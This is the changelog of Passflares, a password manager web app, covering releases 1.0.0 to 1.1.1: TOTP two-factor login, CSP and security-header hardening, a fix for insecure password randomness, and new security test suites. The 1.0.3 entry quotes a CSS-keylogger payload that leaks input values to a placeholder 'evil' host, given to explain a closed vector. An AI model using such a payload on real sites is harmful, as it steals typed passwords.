# Changelog

All notable changes to Passflares are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [1.1.1] — 2026-05-30

Production domain migration to **passflares.com**. The app moves off its
launch host `passflares.pierrefouquet.co.uk` to a dedicated apex domain. This
is a hard cutover — the old host is retired — so existing users sign in once on
the new origin (the session token lives in per-origin `localStorage`). The
zero-knowledge model, vault encryption, and 2FA are unchanged; nothing about
how data is stored or encrypted moves with the domain.

### Changed

- **Serving origin → `passflares.com`** ([wrangler.toml](wrangler.toml)). The
  Worker route is now `passflares.com/*` on the `passflares.com` zone.
  `www.passflares.com` is also routed to the Worker, which permanently
  redirects every www request to the apex (`redirectToCanonicalHost` in
  [src/worker.ts](src/worker.ts), preserving path + query, HSTS on the 301).
- **CORS allow-list + default origin** ([src/worker.ts](src/worker.ts)) now
  name `passflares.com` (and a reserved `api.passflares.com`) instead of the
  old `pierrefouquet.co.uk` origins. The live serving origin is now explicitly
  on the allow-list — previously it relied on requests being same-origin.
- **CSP `connect-src`** ([src/worker.ts](src/worker.ts)) points at
  `https://api.passflares.com` (reserved for future use; no such service ships
  in this release). HSTS, the rest of the CSP, and all other security headers
  are domain-agnostic and unchanged.
- **`security.txt` canonical URL**
  ([public/.well-known/security.txt](public/.well-known/security.txt)) and the
  documentation/live-site links in [README.md](README.md) updated to
  `passflares.com`. The in-app footer version (stale at `v1.0.1`) is corrected
  to `v1.1.1`.
- **More observability** ([wrangler.toml](wrangler.toml)). Worker invocation
  logs (`invocation_logs = true`) and traces (`[observability.traces]`,
  `enabled = true`) are now both turned on. No code or data impact.

### Tests

- CORS/security/header-injection fixtures
  ([tests/backend/cors-strict.test.ts](tests/backend/cors-strict.test.ts),
  [tests/backend/worker-security.test.ts](tests/backend/worker-security.test.ts),
  [tests/backend/header-injection.test.ts](tests/backend/header-injection.test.ts))
  now assert against `https://passflares.com`.

### Migration / deployment

- **No database change and no new secrets.** D1 stores nothing domain-coupled;
  `JWT_SECRET`, `TURNSTILE_KEY`, and `TOTP_ENC_KEY` are unaffected.
- Cloudflare-side prerequisites, staged **before** merge (merge = auto-deploy):
  proxied DNS records for `passflares.com` and `www` (the www→apex redirect is
  handled in the Worker, so no edge redirect rule is needed), a verified
  Universal SSL edge certificate, and `passflares.com` added to the existing
  Turnstile widget's hostname allow-list (same site key + secret — no code
  change).
- Post-cutover cleanup: drop the old `passflares.pierrefouquet.co.uk` Worker
  route and its DNS record so it no longer serves.
- **HSTS is enforced by the Worker, not the Cloudflare edge.** The new
  `passflares.com` zone shipped with edge HSTS set to *max-age=0*, which
  silently overrode the Worker's `Strict-Transport-Security: max-age=31536000;
  includeSubDomains; preload` — caught by the `security-headers-live` probe.
  Resolved by disabling the edge HSTS feature so the Worker's header (defined
  in [src/worker.ts](src/worker.ts) and covered by tests) is authoritative;
  verified live, 12/12 probe green.

## [1.1.0] — 2026-05-30

Two-factor authentication (TOTP) with single-use recovery codes. 2FA is
opt-in: a signed-in user enables it from Settings, and from then on login is
a two-step flow — master password, then a 6-digit authenticator code (or a
recovery code). The zero-knowledge model is unchanged — 2FA is purely an
authentication gate and never touches the client-side vault key, which is
still derived from the master password alone.

### Added

- **TOTP enrolment** ([src/totp.ts](src/totp.ts),
  [migrations/0004_totp_2fa.sql](migrations/0004_totp_2fa.sql)). The server
  issues a *pending* secret; the client shows a QR code + the base32 secret,
  and the secret is only activated once a valid code confirms it. Built on
  the `otpauth` library; QR codes are rendered server-side as an inline SVG
  data URI (`qrcode-svg`), which the existing `img-src 'self' data:` CSP
  already allows — no client-side QR dependency, no CSP change.
- **Single-use recovery codes.** Ten codes are issued on enable, shown once,
  and stored as peppered HMAC-SHA256 hashes — not the slow scrypt KDF, since
  recovery codes are high-entropy and a fast hash allows an O(1) lookup and
  avoids running scrypt up to 10× per recovery login on the Worker. Each
  works once; **Regenerate recovery codes** replaces the set.
- **Two-step login.** `POST /api/login` returns a short-lived token scoped to
  `2fa` (carrying `sub`, not `userId`) instead of a session when 2FA is
  enabled; `POST /api/login/2fa` exchanges it plus a TOTP/recovery code for
  the real session + encryption salt. The auth middleware rejects the
  `2fa`-scoped token on every protected route, so it can never reach vault
  data. The verification endpoint is rate-limited per IP and per user.
- **Change authenticator** (move to a new phone) and **Disable 2FA**, both
  requiring the master password plus a current code (or recovery code).
  Changing keeps the old authenticator valid until the new one is confirmed,
  so there is no lock-out window.
- **TOTP secrets encrypted at rest** with AES-GCM under a new `TOTP_ENC_KEY`
  worker secret (HKDF-derived sub-keys separate the encryption key from the
  recovery-code pepper). Fails closed if the secret is unset.
- Settings UI, the login second-factor prompt,
  [public/css/components/totp.css](public/css/components/totp.css), and a new
  "Two-factor authentication" section in the
  [user guide](public/docs/user-guide.html).

### Tests

- New backend suites [tests/backend/totp.test.ts](tests/backend/totp.test.ts)
  and [tests/backend/totp-handlers.test.ts](tests/backend/totp-handlers.test.ts)
  cover add / remove / change / the recovery-code lifecycle and the second
  login step. Frontend
  [tests/frontend/api-2fa.test.js](tests/frontend/api-2fa.test.js) and e2e
  [tests/e2e/2fa.spec.ts](tests/e2e/2fa.spec.ts) cover login with and without
  2FA, enrolment, disable, change, and recovery-code flows. Unit suite 329
  passing; e2e 63 passing / 17 intentionally skipped.
- The opt-in live header probe
  [tests/e2e/security-headers-live.spec.ts](tests/e2e/security-headers-live.spec.ts)
  now requires a CSP only on HTML/API responses, matching the worker's
  deliberate omission of CSP on static JS/CSS subresources (previously the
  probe and [worker-security.test.ts](tests/backend/worker-security.test.ts)
  disagreed).

### Migration / deployment

- Apply the new migration to production D1:
  `npx wrangler d1 migrations apply secure-password-db --remote` — additive
  (two new tables, `user_totp` and `user_recovery_codes`); no impact on
  existing users until they opt in.
- Set the new secret **before** deploying:
  `npx wrangler secret put TOTP_ENC_KEY` (a long random value, e.g.
  `openssl rand -base64 48`). 2FA enrol/verify fail closed without it;
  rotating it later invalidates existing 2FA enrolments.

## [1.0.4] — 2026-05-27

Site-recovery + security-hardening release. Three unrelated streams that all
hit at once:

1. **Live site recovery.** After 1.0.3 shipped, three Dependabot
   version-update PRs auto-merged on green CI: `itty-router` 4.2 → 5.0
   (renamed `Router` to `AutoRouter` and changed routing internals),
   `typescript` 5.9 → 6.0, and `@types/node` 20 → 25. The itty-router
   major was a breaking API change — the build compiled clean but the
   Worker threw `Error 1101` on every request once Cloudflare auto-
   deployed. Pinned all three back to known-good versions.

2. **Critical CodeQL alert: insecure randomness in the password
   generator.** CodeQL's `js/insecure-randomness` flagged five sites in
   [public/js/utils.js](public/js/utils.js) where
   `generateRandomPassword()` used `Math.random()` to pick characters —
   and used `.sort(() => Math.random() - 0.5)` for the final shuffle
   (which is both biased and non-CSPRNG). For a *password manager* this
   was a real failure mode: generated passwords were drawn from a
   predictable PRNG state. Rewrote the generator to use
   `crypto.getRandomValues()` with rejection-sampled unbiased
   `secureRandomInt()` and a proper Fisher-Yates shuffle.

3. **The e2e auth-bypass plumbing** (issue #27, filed in 1.0.3) is
   fixed. The root cause was that `boot()` requires both `isLoggedIn()`
   *and* `hasKey()`, but the test fixture could only seed localStorage
   — the encryption key is a derived `CryptoKey` that only exists in
   memory. Added a clearly-marked `__PASSFLARES_E2E_FAKE_KEY` window
   test seam in [public/js/main.js](public/js/main.js) and rewrote
   `gotoAndSeedLogin` in [tests/e2e/fixtures.ts](tests/e2e/fixtures.ts)
   to inject it via `addInitScript`. E2E suite now runs 45 / 0 / 17
   (passed / failed / skipped-intentional-live-deploy).

Closes #27.

### Fixed

- **CRITICAL — `generateRandomPassword`** in
  [public/js/utils.js](public/js/utils.js) no longer uses `Math.random()`.
  New `secureRandomInt(max)` helper does rejection-sampling on
  `crypto.getRandomValues` to avoid modulo bias. Final shuffle is a
  cryptographic Fisher-Yates, not the broken
  `Array.sort(() => Math.random() - 0.5)` pattern. Closes five
  CodeQL `js/insecure-randomness` alerts.
- **CodeQL `js/tainted-format-string`** in
  [public/js/router.js](public/js/router.js): `console.error` now
  receives `name` as a separate argument instead of inside the format
  string template, so a route name containing `%s` / `%d` can't consume
  the next argument as a placeholder value.
- **CodeQL `js/bad-tag-filter`** in
  [tests/backend/static-security-audit.test.ts](tests/backend/static-security-audit.test.ts):
  the inline-script regex now matches `</script\s*>` (HTML5 permits
  whitespace before the closing `>`).
- **E2E auth-bypass** (`gotoAndSeedLogin`): the test fixture now sets
  a `__PASSFLARES_E2E_FAKE_KEY` window flag via `page.addInitScript`
  before navigation; `boot()` honours it via a clearly-marked test
  seam. Closes issue #27.

### Changed

- **`@noble/hashes` 1.4.0 → 2.2.0.** Picks up the March 2026 self-audit,
  the `pbkdf2`/`blake2`/`turboshake`/`kt` `dkLen=0` handling fix, the
  `parallelHash` `blockLen=0` fix, and the `argon2` progress-callback fix.
  2.x requires `.js` extension on submodule imports, so
  [src/utils.ts](src/utils.ts) now imports `@noble/hashes/scrypt.js` and
  `@noble/hashes/utils.js`. Runtime behaviour unchanged. (This
  supersedes Dependabot PR #31, which is being closed.)
- **Pinned majors that broke 1.0.3 → main:** `itty-router` ^5.0.23
  → ^4.2.2, `typescript` ^6.0.3 → ^5.9.3, `@types/node` ^25.9.1 →
  ^20.19.41. These had auto-merged on green CI but `itty-router 5.x`
  broke the Worker runtime (Router → AutoRouter rename).
- **`dependabot.yml`** now ignores SemVer-major version-update PRs
  globally. Major bumps need a human review and a full test-suite
  pass before landing. Important: this `ignore` only affects the
  routine version-update channel — Dependabot security-update PRs
  (driven by GitHub Advisory Database CVEs, configured separately in
  repo Settings → Code security & analysis) are documented to ignore
  this field, so security PRs still flow through even if they are
  major-version bumps.
- Removed the stale `release` script from
  [package.json](package.json) — it referenced the `production` branch
  that was retired in commit `1fcbac5`.

### Added

- **Password generator regression tests** in
  [tests/frontend/utils.test.js](tests/frontend/utils.test.js):
  - `Math.random` must never be called during generation (stub +
    counter assertion).
  - `crypto.getRandomValues` must be invoked at least once per
    character generated.
  - Lengths < 4 are coerced to 4 (so all four character-class
    requirements can be met).
  - The Fisher-Yates shuffle actually moves characters around — the
    seeded `(lower, upper, digit, symbol)` quartet must not stay
    pinned at positions 0..3 across a 200-call statistical sample.

## [1.0.3] — 2026-05-27

CSP hardening release. Threat-modelled the residual XSS surface against the
master-password input (the single most valuable secret in the app) and
closed the CSS-keylogger vector that an HTML-injection bug — if one ever
slipped past escaping — could otherwise exploit. Also drops the legacy
browser XSS auditor header that has been used in the wild to selectively
disable JavaScript on otherwise-safe pages. Picked up follow-on findings
from Hardenize, ImmuniWeb, and a deliberate code-review pass.

### Changed

- **`Content-Security-Policy` tightened on HTML responses** in
  [src/worker.ts](src/worker.ts):
  - `default-src` flipped from `'self'` to `'none'` — deny by default;
    every resource type now must explicitly opt back in. Anything we
    forget to declare in future is blocked, not silently allowed.
  - `'unsafe-inline'` removed from `style-src`. This closes the
    CSS-keylogger attack vector
    (`input[value^="a"] { background: url('//evil/?'attr(value)) }`)
    that any future HTML-injection regression would otherwise expose
    against the master-password input. Sixteen inline `style="..."`
    attributes across `public/index.html` and the JS page templates
    were moved into utility classes in
    [public/css/base.css](public/css/base.css) and
    [public/css/components/pages.css](public/css/components/pages.css).
- **`X-XSS-Protection: 1; mode=block` → `X-XSS-Protection: 0`.** Modern
  browsers (Chrome 78+, Firefox) already removed their XSS auditors, and
  Safari's `mode=block` auditor has been used to selectively disable
  legitimate JavaScript in otherwise-safe pages. Explicitly off is the
  current best-practice configuration; CSP does the real work.
- `roleControl` / `removeBtn` helper variables in
  [public/js/pages/orgs.js](public/js/pages/orgs.js) were inlined into
  the `innerHTML` template so the new escapeHTML guardrail (below) can
  walk them statically.
- Icon-name interpolations (`${iconName}`, `${t.icon}`) now go through
  `escapeHTML()` everywhere. They were previously safe in practice, but
  wrapping them is the cheaper defence-in-depth choice and removes the
  guardrail test's false-positive on these identifiers.

### Added

- **`tests/backend/static-security-audit.test.ts`** gained three new
  guardrail suites:
  - No `style="..."` attribute may appear in any shipped HTML file.
  - No `style="..."` attribute may appear inside any JS template
    literal.
  - Every `${...}` interpolation inside an ``innerHTML = `…` ``
    template must either pass through `escapeHTML(...)` or match the
    small allowlist of statically-safe shapes (string/number literals,
    `SCREAMING_SNAKE` constant lookups, nested template literals,
    ternary/`??`/`||` expressions whose arms are themselves safe). A
    forgotten escape on a future PR fails CI before it can ship a
    stored-XSS vector through a vault, entry, or org name.
- **`worker-security.test.ts`** gained assertions that `default-src` is
  `'none'`, `style-src` carries no `'unsafe-inline'` (and no
  `'unsafe-hashes'`), and `X-XSS-Protection` is `0`.
- **`.github/dependabot.yml`** opens grouped weekly version-update PRs
  for npm and github-actions ecosystems. Pairs with the
  Dependabot-security-updates feature already enabled in repo settings,
  which handles security patches separately.

### Known follow-up (not blocking 1.0.3)

- The e2e suite's `gotoAndSeedLogin` fixture
  ([tests/e2e/fixtures.ts](tests/e2e/fixtures.ts)) seeds `jwtToken` /
  `userInfo` into localStorage and reloads, but the auth screen never
  hides — confirmed pre-existing on the previous tip of `main`, not
  caused by 1.0.3. Vitest (280/280) is the load-bearing signal for
  this release. The e2e suite needs a separate fix to its sign-in
  bypass plumbing.

## [1.0.2] — 2026-05-26

Follow-up to 1.0.1. A re-scan after 1.0.1 was deployed still flagged the same
missing-header findings on `passflares.pierrefouquet.co.uk`. Direct probing
revealed that the security headers were applied correctly to `/api/*`
responses but completely absent from `/` and `/js/*.js` — `cf-cache-status:
HIT`, no worker headers in sight. Root cause: Cloudflare Workers' `[assets]`
binding defaults to `run_worker_first = false`, so any request that matches a
static asset is served directly by the CDN and the Worker is never invoked.
1.0.1's `withSecurityHeaders()` was correct in code but never ran for the
HTML/JS/CSS responses the scanner was probing.

### Changed

- `wrangler.toml` and `wrangler.toml.example` now set
  `run_worker_first = true` on the `[assets]` binding. The Worker runs for
  every request, asset or not, so the security-header layer reaches static
  responses too.
- All five docs pages (`public/docs/*.html`) now load the theme bootstrap
  via `<script src="../js/prefs-bootstrap.js">` instead of an inline
  `<script>` block. Same fix the app shell got in 1.0.0; needed here too
  because the Worker (now running on every request) applies the strict CSP
  to the docs pages as well, and the inline block would have been blocked.
  Caught by the new `static-security-audit.test.ts` suite below.
- `package.json` adds `test:audit` (`npm audit --audit-level=moderate`)
  and chains it into `test:all` so dependency vulnerabilities surface
  alongside test failures. Initial run cleared three moderate-severity
  transitive findings in `ws` (via `miniflare` via `wrangler`) by way of
  a non-breaking `npm audit fix`.

### Added

- `tests/backend/wrangler-config.test.ts` — parses `wrangler.toml` and
  `wrangler.toml.example` and asserts `[assets].run_worker_first === true`.
  Regression guard for this exact bypass.
- `tests/backend/cors-strict.test.ts` — unknown / missing `Origin` does
  not get echoed back; CORS never combines `*` with `Allow-Credentials: true`;
  OPTIONS preflight carries the base security headers too.
- `tests/backend/http-methods.test.ts` — TRACE rejected, vault routes
  return 401 + security headers when called without `Authorization`,
  unknown `/api/*` paths return 404 with security headers, HEAD matches GET.
- `tests/backend/header-injection.test.ts` — CR/LF bytes in `Origin`
  and request bodies never appear verbatim in response headers; oversize
  `Origin` is ignored, not echoed.
- `tests/backend/static-security-audit.test.ts` — repo-level greps:
  no `http://` URLs in `public/**`, no PEM markers, no `console.log` or
  `debugger` left in `public/js/**`, no inline `<script>` blocks in any
  `public/**/*.html`, `robots.txt` exposes no admin paths.
- `tests/backend/vuln-classes.test.ts` — behavioural tests for IDOR,
  missing/expired/tampered JWT, mass-assignment on `/api/users/me/preferences`,
  prototype pollution, path traversal, behavioural SQL-injection probe,
  loose login-timing check, and oversize-body handling.
- `tests/e2e/security-headers-live.spec.ts` — opt-in Playwright spec that
  probes the deployed site (`LIVE_HOST=https://passflares.pierrefouquet.co.uk
  npx playwright test security-headers-live`) and asserts every public path
  carries CSP, HSTS, `X-Content-Type-Options`, `Referrer-Policy`,
  `X-Frame-Options`, and `Permissions-Policy`. Skipped when `LIVE_HOST` is
  unset so offline CI still passes.
- Extra assertions in `tests/backend/worker-security.test.ts`: HSTS
  `max-age` ≥ 7,776,000 with `preload`; HTML CSP names every directive
  (`default-src`, `script-src`, `style-src`, `img-src`, `font-src`,
  `connect-src`, `frame-src`, `manifest-src`, `base-uri`, `object-src`,
  `form-action`, `frame-ancestors`); `script-src` rejects `'unsafe-eval'`,
  `*`, and `data:`; no `X-Powered-By` is emitted; base security headers
  also land on JS, font, and image responses.
- `SECURITY.md` now notes that `/cdn-cgi/*` is Cloudflare-managed edge
  infrastructure and is intentionally out of scope for this repo.

### Deployment notes

- After deploy, Cloudflare may still serve the previous header-less
  responses from edge cache. Purge via the Cloudflare dashboard
  (Caching → Configuration → Purge Everything) or the API:

  ```sh
  curl -X POST \
    "https://api.cloudflare.com/client/v4/zones/<zone_id>/purge_cache" \
    -H "Authorization: Bearer <token>" \
    -H "Content-Type: application/json" \
    --data '{"purge_everything":true}'
  ```

## [1.0.1] — 2026-05-26

Security hardening release following an external Pentest-Tools Light scan
against `passflares.pierrefouquet.co.uk`. The scan flagged seven low-severity
findings, all of which were misconfiguration / missing-defence-in-depth
issues — no exploitable vulnerabilities were reported. This release addresses
every confirmed finding and mitigates the one unconfirmed false-positive.

### Added

- `public/.well-known/security.txt` so external researchers have a
  discoverable channel for vulnerability reports (closes the scanner's
  "Security.txt file is missing" finding).
- Backend tests (`tests/backend/worker-security.test.ts`) asserting that
  every static-page response carries HSTS, `X-Content-Type-Options`,
  `Referrer-Policy`, and a CSP with `base-uri`, `object-src 'none'`,
  `form-action`, and `frame-ancestors`. Catches future regressions.
- Static-analysis guardrail tests (`tests/backend/code-security-invariants.test.ts`)
  that grep `src/` for risky patterns ruled out during the 1.0.1 review:
  no `eval` / `new Function`, every `DB.prepare()` uses a static string
  literal (no template interpolation, no concatenation), and every `fetch()`
  in worker code targets a constant URL or string literal — never a
  user-controlled value. Failing means a regression has re-introduced one
  of those patterns.
- Regression tests (`tests/frontend/dialog-xss.test.js`) covering the
  dialog XSS fix below — both the title and confirmDialog message round-
  trip as text, not HTML.
- Static-content tests (`tests/backend/static-content.test.ts`) asserting
  `security.txt` carries the required RFC 9116 fields with a future
  `Expires`, that `index.html` has no inline `<script>` blocks or
  duplicated `<meta>` CSP, and that the auth forms declare `method="post"`.

### Changed

- Security headers (HSTS, `X-Content-Type-Options`, `Referrer-Policy`,
  `Permissions-Policy`, `X-Frame-Options`, `Content-Security-Policy`) are
  now sent on every response, not just `/api/*`. Previously the static
  HTML/JS/CSS responses had none of them, which is what the external
  scanner picked up.
- CSP for HTML pages tightened: added `base-uri 'self'`, `object-src 'none'`,
  `form-action 'self'`, `frame-ancestors 'none'`. The `<meta>` CSP in
  `public/index.html` was removed — the worker is now the single source of
  truth so the policy can't drift between the header and the tag.
- API responses now carry a deny-by-default CSP (`default-src 'none'`) since
  JSON endpoints should never load any subresource.
- HSTS bumped to include the `preload` directive.
- `handleDeleteAccount` in `src/auth.ts` no longer builds a
  `DELETE … WHERE id IN (?, ?, …)` statement via template-literal
  interpolation. It now prepares a single literal `DELETE … WHERE id = ?`
  and runs the per-vault deletes via `env.DB.batch()`. Functionally
  equivalent and satisfies the static-analysis guardrail above.
- The router error fallback (`public/js/router.js`) builds its error state
  through DOM APIs instead of `innerHTML`, so any `err.message` derived
  from API or user data cannot inject markup into the error view.
- The app-bar brand SVG in `public/js/main.js` is parsed via `DOMParser`
  (`image/svg+xml`) and inserted with `replaceChildren`, mirroring the
  pattern already used in the auth screen. Removes a same-origin `innerHTML`
  path for SVG content.

### Fixed

- Dialog title and `confirmDialog` message are now rendered with
  `textContent`, not HTML interpolation. Callers that pass vault, entry,
  or organisation names (any user-controlled string) into a dialog can no
  longer smuggle markup or executing payloads through the modal — closes
  a stored-XSS vector reachable via shared vaults and org membership.
- `openDialog` no longer crashes with a TDZ `ReferenceError` when the
  caller awaits `closedPromise`. The close-resolver is captured in a
  local `let` before the promise is constructed, instead of being
  attached to an `api` object that hadn't been declared yet.
- `ensureRoot()` in `public/js/dialog.js` re-fetches `#dialog-root` when
  the cached reference is no longer attached to `document.body`, so the
  dialog manager survives test setup that resets `document.body.innerHTML`
  between cases (and any future page mount that detaches the host).
- Login and register forms now declare `method="post"` explicitly. They are
  still handled in JavaScript with `preventDefault`, so behaviour is
  unchanged, but the explicit method clears the scanner's
  "Password Submitted in URL" heuristic (the form previously defaulted to
  `GET`, which the scanner flags even when JS intercepts the submit).

## [1.0.0] — 2026-05-23

First stable release. Marks the end of the 1.x/2.x beta line as the codebase
has settled around the Cloudflare Workers + R2 + D1 + KV architecture, with a
mature feature set across personal vaults, organisations, sharing, and
preferences sync.

### Added

- Server-side Turnstile verification on `/api/register` and `/api/login`. A
  missing or invalid token now blocks sign-in and account creation (previously
  the widget was rendered but never checked).
- Per-IP rate limit on `/api/register` (5 attempts / 15 minutes), mirroring
  the existing `/api/login` lockout.
- `production` branch as the explicit release target — `main` is the
  integration branch; Cloudflare's GitHub integration deploys only when
  `main` is fast-forwarded into `production`. New `npm run release` script
  automates the merge.
- `wrangler.toml.example` with placeholder IDs and setup instructions so
  forkers can self-host without colliding with the upstream maintainer's
  Cloudflare resources.
- Unit tests for `verifyTurnstile`, plus auth-handler tests covering missing
  tokens, failed verification, and register rate-limit lockout.
- Playwright specs confirming the Ctrl+K shortcut hint and command palette
  keyboard footer are hidden on mobile viewports and shown on desktop.

### Changed

- Mobile (≤ 860px) no longer renders the Ctrl+K / `↑ ↓ Enter Esc` keyboard
  hints in the search bar or command palette — desktop behaviour unchanged.
- `Content-Security-Policy` on `public/index.html` no longer allows
  `'unsafe-inline'` for `script-src`. The pre-paint theme bootstrap is now
  served from `public/js/prefs-bootstrap.js`.
- Brand-mark SVG is parsed via `DOMParser` instead of `innerHTML` in the
  auth screen.
- `ALLOWED_ORIGINS` in `src/worker.ts` dropped the leftover
  `prerelease.passflares.*` host that was orphaned when the prerelease
  environment was removed.

### Removed

- Debug `console.log` calls from `public/js/session.js`. Error/warn paths
  remain.

### Fixed

- Empty `try { … } catch {}` blocks in `public/js/prefs.js` now carry a
  one-line comment naming the swallowed condition (localStorage quota,
  listener safety, corrupt cache).

### Security

- Turnstile is now genuinely enforced (see Added).
- CSP tightened (see Changed).
- Master password continues to be transmitted only inside the TLS tunnel
  (HSTS `max-age=31536000`) and never stored server-side; only its scrypt
  hash is persisted in D1. Vault contents are encrypted client-side with
  AES-256-GCM before they ever leave the browser. None of this changed in
  1.0 — it's restated here for completeness on the milestone release.

### Known follow-ups (not blocking 1.0)

- JWT session tokens live in `localStorage`. Mitigated by 5-minute inactivity
  timeout and 1-hour server-side expiry; future work: move to an HttpOnly
  cookie.
- Local-dev origins (`localhost:8080`, `localhost:5173`) remain in
  `ALLOWED_ORIGINS`. They cannot be exploited because browsers enforce the
  `Origin` header, but a future change could gate them on an environment
  variable for cleanliness.

[1.0.1]: https://github.com/PierreFouquet/Passflares/releases/tag/v1.0.1
[1.0.0]: https://github.com/PierreFouquet/Passflares/releases/tag/v1.0.0
